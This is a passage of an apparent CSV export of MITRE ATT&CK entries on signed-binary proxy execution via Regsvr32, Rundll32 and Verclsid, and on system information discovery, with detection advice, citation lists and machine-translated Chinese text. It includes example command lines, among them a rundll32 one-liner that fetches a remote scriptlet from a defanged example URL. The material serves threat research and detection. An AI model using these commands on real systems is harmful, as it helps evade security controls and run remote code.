Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",https://attack.mitre.org/techniques/T1218/010,23 January 2020,11 March 2022,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016),Windows,"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Anti-virus, Application control, Digital Certificate Validation",Casey Smith,"Administrator, User",,,,,,"(Citation: Red Canary Qbot),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Valak May 2020),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: RSA Shell Crew),(Citation: Lab52 WIRTE Apr 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Unit 42 Valak July 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: ATT QakBot April 2021),(Citation: Sophos Ragnar May 2020),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: Fidelis INOCNATION),(Citation: ThreatGeek Derusbi Converge),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET OceanLotus Mar 2019),(Citation: FireEye APT19),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Lazarus Jun 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Talos Cobalt Group July 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Github Koadic),(Citation: ESET EvilNum July 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: KISA Operation Muzabi),(Citation: Cybereason Cobalt Kitty 2017),(Citation: JoeSecurity Egregor 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Cyberint Qakbot May 2021),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: DFIR Conti Bazar Nov 2021),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Secure Host Baseline EMET),(Citation: Windows Commands JPCERT),(Citation: Corio 2008)",系统二进制代理执行/利用已签名的二进制文件代理执行：Regsvr32,攻击者可能会滥用 Regsvr32.exe 来代理恶意代码的执行。 Regsvr32.exe 是一个命令行程序，用于在 Windows 系统上注册和注销对象链接和嵌入控件，包括动态链接库 (DLL)。 Regsvr32.exe 二进制文件也可能由 Microsoft 签名。 （引用：Microsoft Regsvr32） Regsvr32.exe 的恶意使用可能会避免触发安全工具，这些安全工具可能无法监控 regsvr32.exe 进程的执行和加载的模块，因为 Windows 使用 regsvr32.exe 进行正常操作时会出现白名单或误报。 Regsvr32.exe 还可用于专门绕过应用程序控制，使用功能加载 COM 脚本以在用户权限下执行 DLL。由于 Regsvr32.exe 支持网络和代理，因此可以通过在调用期间将统一资源定位器 (URL) 作为参数传递到外部 Web 服务器上的文件来加载脚本。此方法不会更改注册表，因为 COM 对象实际上并未注册，只是执行。 （引用：LOLBAS Regsvr32）该技术的这种变体通常被称为“Squibldoo”，并已用于针对政府的活动。 （引文：Carbon Black Squibldoo Apr 2016）（引文：FireEye Regsvr32 针对蒙古政府）Regsvr32.exe 还可以用来注册一个 COM 对象，用于通过 [组件对象模型劫持]（https://attack.mitre.组织/技术/T1546/015）。 （引文：Carbon Black Squibldoo 2016 年 4 月）
T1218.011,System Binary Proxy Execution: Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",https://attack.mitre.org/techniques/T1218/011,23 January 2020,19 April 2022,2.0,Defense Evasion,"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.

Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",Windows,"Command: Command Execution, File: File Metadata, Module: Module Load, Process: Process Creation",True,T1218,"Anti-virus, Application control, Digital Certificate Validation","Casey Smith; Gareth Phillips, Seek Ltd.; James_inthe_box, Me; Ricardo Dias",,,,,,,"(Citation: Arbor Musical Chairs Feb 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: CopyKittens Nov 2015),(Citation: ATT QakBot April 2021),(Citation: ESET RTM Feb 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: ClearSky Wilted Tulip July 2017),(Citation: F-Secure Sofacy 2015),(Citation: ESET Operation Groundbait),(Citation: ESET Lazarus Jun 2020),(Citation: ESET Zebrocy May 2019),(Citation: FireEye Clandestine Fox),(Citation: ESET Operation Spalax Jan 2021),(Citation: Dell Sakula),(Citation: Palo Alto Comnie),(Citation: Gigamon Berserk Bear October 2021),(Citation: Deep Instinct TA505 Apr 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Crowdstrike Qakbot October 2020),(Citation: Symantec Briba May 2012),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Kaspersky Carbanak),(Citation: Talos Seduploader Oct 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Unit42 Redaman January 2019),(Citation: Sophos Ragnar May 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Microsoft SIR Vol 19),(Citation: ESET Telebots July 2017),(Citation: FireEye APT19),(Citation: IBM MegaCortex),(Citation: Bitdefender APT28 Dec 2015),(Citation: Novetta Winnti April 2015),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Crowdstrike DNC June 2016),(Citation: Github Koadic),(Citation: F-Secure CozyDuke),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Emissary Trojan Feb 2016),(Citation: Unit 42 Bisonal July 2018),(Citation: McAfee Lazarus Jul 2020),(Citation: SentinelOne NobleBaron June 2021),(Citation: Medium KONNI Jan 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Lotus Blossom Jun 2015),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Talos Nyetya June 2017),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Volexity Exchange Marauder March 2021),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: FireEye APT29 Nov 2018),(Citation: ESET Dukes October 2019),(Citation: Cylance Shell Crew Feb 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Cybereason Egregor Nov 2020),(Citation: Symantec Orangeworm April 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Cybereason TA505 April 2019),(Citation: Rancor Unit42 June 2018),(Citation: Red Canary Qbot),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Secure List Bad Rabbit),(Citation: RedCanary Mockingbird May 2020),(Citation: Microsoft Winnti Jan 2017),(Citation: FireEye FELIXROOT July 2018),(Citation: Crysys Skywiper),(Citation: Palo Alto Sofacy 06-2018),(Citation: ESET Attor Oct 2019),(Citation: ESET GreyEnergy Oct 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberint Qakbot May 2021),(Citation: Netskope Squirrelwaffle Oct 2021),",系统二进制代理执行/利用已签名的二进制文件代理执行：Rundll32,"攻击者可能会滥用 rundll32.exe 来代理恶意代码的执行。使用rundll32.exe，副直接执行（即[共享模块]（https://attack.mitre.org/techniques/T1129）），可以避免触发安全工具，因为允许列表可能无法监控rundll32.exe进程的执行或来自正常操作的误报。 Rundll32.exe 通常与执行 DLL 有效负载相关联（例如：<code>rundll32.exe {DLLname, DLLfunction}</code>）。 Rundll32.exe也可以通过未记录的shell32.dll函数<code>Control_RunDLL</code来执行[控制面板](https://attack.mitre.org/techniques/T1218/002)项目文件(.cpl) > 和 <code>Control_RunDLLAsUser</code>。双击 .cpl 文件也会导致 rundll32.exe 执行。 （引用：趋势科技 CPL） Rundll32 还可用于执行 JavaScript 等脚本。这可以使用类似于以下的语法来完成：<code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.] example[.]com/malicious.sct"")""</code> 这种行为已被 Poweliks 等恶意软件使用。（引用：这是安全命令行混淆）攻击者还可能试图通过滥用来掩盖恶意代码的分析rundll32.exe 加载 DLL 函数名称的方式。作为 Windows 对各种字符集的兼容性支持的一部分，rundll32.exe 将首先检查宽/Unicode，然后是 ANSI 字符支持的函数，然后再加载指定的函数（例如，给定命令<code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe 将首先尝试执行 <code>ExampleFunctionW</code>，或者在加载 <code> 之前失败 <code>ExampleFunctionA</code> ExampleFunction</code>)。因此，攻击者可能会通过创建多个相同的导出函数名称来掩盖恶意代码s 并将 <code>W</code> 和/或 <code>A</code> 附加到无害的。（引用：Attackify Rundll32.exe Obscurity）（引用：Github NoRunDll）DLL 函数也可以通过以下方式导出和执行序数（例如：<code>rundll32.exe file.dll,#1</code>）。此外，攻击者可能会使用 [伪装](https://attack.mitre.org/techniques/T1036) 技术（例如更改 DLL 文件名、文件扩展名或函数名）来进一步隐藏恶意负载的执行。（引文：rundll32.exe防御规避）"
T1218.012,System Binary Proxy Execution: Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)

Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) ",https://attack.mitre.org/techniques/T1218/012,10 August 2020,20 May 2022,2.0,Defense Evasion,"Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.",Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Rodrigo Garcia, Red Canary",,,,,,,"(Citation: Red Canary Verclsid.exe),",系统二进制代理执行/利用已签名的二进制文件代理执行：Verclsid,攻击者可能会滥用 verclsid.exe 来代理恶意代码的执行。 Verclsid.exe 被称为扩展 CLSID 验证主机，负责在 Windows Explorer 或 Windows Shell 使用每个 shell 扩展之前对其进行验证。（引用：WinOSBite verclsid.exe） 攻击者可能会滥用 verclsid.exe 来执行恶意负载。这可以通过运行 <code>verclsid.exe /S /C {CLSID}</code> 来实现，其中文件由类 ID (CLSID) 引用，这是一个用于标识 COM 对象的唯一标识号。由 verclsid.exe 执行的 COM 有效负载可能能够执行各种恶意操作，例如从远程服务器加载和执行 COM 脚本 (SCT)（类似于 [Regsvr32]（https://attack.mitre.org/techniques/T1218/ 010))。由于二进制文件可能在 Windows 系统上经过签名和/或本机，通过 verclsid.exe 代理执行可能会绕过不考虑其潜在滥用的应用程序控制解决方案。（引用：LOLBAS Verclsid）（引用：Red Canary Verclsid.exe）（引用：BOHOPS 滥用 COM 注册表）（引用：Nick Tyrer GitHub）
T1082,System Information Discovery,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)

Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",https://attack.mitre.org/techniques/T1082,31 May 2017,06 September 2022,2.5,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.","IaaS, Linux, Network, Windows, macOS","Command: Command Execution, Instance: Instance Metadata, Process: OS API Execution, Process: Process Creation",False,,,"Austin Clark, @c2defense; Maril Vernon @shewhohacks; Praetorian",,,,CAPEC-312,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: US-CERT BADCALL),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET RTM Feb 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: ESET LoudMiner June 2019),(Citation: Unit 42 Inception November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: Fysbis Palo Alto Analysis),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Operation Groundbait),(Citation: Eclypsium Trickboot December 2020),(Citation: Securelist Darkhotel Aug 2015),(Citation: FSecure Lokibot November 2019),(Citation: Cybereason Bazar July 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Google EXOTIC LILY March 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: FireEye APT33 Sept 2017),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: Unit42 Sofacy Dec 2018),(Citation: Symantec Dragonfly),(Citation: 20 macOS Common Tools and Techniques),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Symantec Volgmer Aug 2014),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: McAfee Maze March 2020),(Citation: ESET Telebots July 2017),(Citation: Cisco CaddyWiper March 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Talos ROKRAT 2),(Citation: Anomali Rocke March 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Cymmetria Patchwork),(Citation: Avira Mustang Panda January 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: F-Secure CozyDuke),(Citation: BlackBerry Amadey 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Check Point APT34 April 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: APT15 Intezer June 2018),(Citation: Talos ROKRAT),(Citation: Cylance Dust Storm),(Citation: Fortinet Agent Tesla June 2017),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: FireEye APT32 April 2020),(Citation: PWC WellMess July 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: Check Point Warzone Feb 2020),(Citation: Lazarus APT January 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Novetta Blockbuster Loaders),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Securelist APT10 March 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: Cylance Shell Crew Feb 2017),(Citation: Fortinet Diavol July 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: JoeSecurity Egregor 2020),(Citation: Fidelis TrickBot Oct 2016),(Citation: Volexity PowerDuke November 2016),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: ESET OceanLotus macOS April 2019),(Citation: Rancor Unit42 June 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Forcepoint Felismus Mar 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: ESET Machete July 2019),(Citation: Accenture Lyceum Targets November 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ASERT Donot March 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Microsoft SIR Vol 21),(Citation: Securelist BlackEnergy Nov 2014),(Citation: PaloAlto DNS Requests May 2016),(Citation: Check Point Meteor Aug 2021),(Citation: TechNet Systeminfo),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: CISA WellMess July 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Check Point Pay2Key November 2020),(Citation: Malwarebytes Dyreza November 2015),(Citation: Palo Alto OilRig Oct 2016),(Citation: Proofpoint Azorult July 2018),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT32 May 2017),(Citation: Symantec Inception Framework March 2018),(Citation: ESET Hermetic Wizard March 2022),(Citation: Securelist Octopus Oct 2018),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: NHS Digital Egregor Nov 2020),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Intel 471 REvil March 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET ForSSHe December 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Symantec Chafer Dec 2015),(Citation: Unit 42 CARROTBAT January 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: IBM IcedID November 2017),(Citation: McAfee Night Dragon),(Citation: Unit 42 Shamoon3 2018),(Citation: CERT-EE Gamaredon January 2021),(Citation: Malwarebytes Pony April 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: Unit 42 PingPull Jun 2022),(Citation: BiZone Lizar May 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: Prevx Carberp March 2011),(Citation: Talos Konni May 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Baumgartner Naikon 2015),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Emissary Trojan Feb 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Symantec Pasam May 2012),(Citation: Secureworks REvil September 2019),(Citation: Talos Group123),(Citation: DFIR Ryuk's Return October 2020),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Kaspersky Turla),(Citation: Talos Oblique RAT March 2021),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: Korean FSI TA505 2020),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: GitHub PoshC2),(Citation: SentinelOne Valak June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: F-Secure The Dukes),(Citation: Palo Alto Shamoon Nov 2016),(Citation: CrowdStrike Ryuk January 2019),(Citation: DustySky),(Citation: Fidelis Turbo),(Citation: Lazarus RATANKBA),(Citation: CrowdStrike Putter Panda),(Citation: Group IB Ransomware May 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Gh0stRAT ATT March 2019),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Cybereason Astaroth Feb 2019),(Citation: XAgentOSX 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: Securelist ScarCruft May 2019),(Citation: Novetta-Axiom),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro Gamaredon April 2020),(Citation: NCC Group Chimera January 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Bankshot),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: ESET Sednit Part 1),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: RATANKBA),(Citation: Carbon Black Shlayer Feb 2019),(Citation: ESET Sednit Part 2),(Citation: Talos Promethium June 2020),(Citation: Group IB Ransomware September 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Micropsia June 2017),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: FireEye APT34 July 2019),(Citation: ESET LightNeuron May 2019),(Citation: Reaqta MuddyWater November 2017),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: McAfee Cuba April 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: Talos NavRAT May 2018),(Citation: Profero APT27 December 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: GitHub QuasarRAT),(Citation: McAfee Oceansalt Oct 2018),(Citation: Palo Alto OilRig May 2016),(Citation: FireEye APT19),(Citation: Symantec Frutas Feb 2013),(Citation: US-CERT Volgmer Nov 2017),(Citation: Medium Anchor DNS July 2020),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: SecureList Griffon May 2019),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Dragos Crashoverride 2017),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: evolution of pirpi),(Citation: Securelist Kimsuky Sept 2013),(Citation: Malwarebytes Higaisa 2020),(Citation: Microsoft NICKEL December 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: PTSecurity Higaisa 2020),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Lotus Blossom Jun 2015),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET ComRAT May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Talos Zeus Panda Nov 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: FireEye SMOKEDHAM June 2021),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: ESET Gelsemium June 2021),(Citation: Talos Frankenstein June 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: McAfee Netwire Mar 2015),(Citation: FireEye FiveHands April 2021),(Citation: FireEye 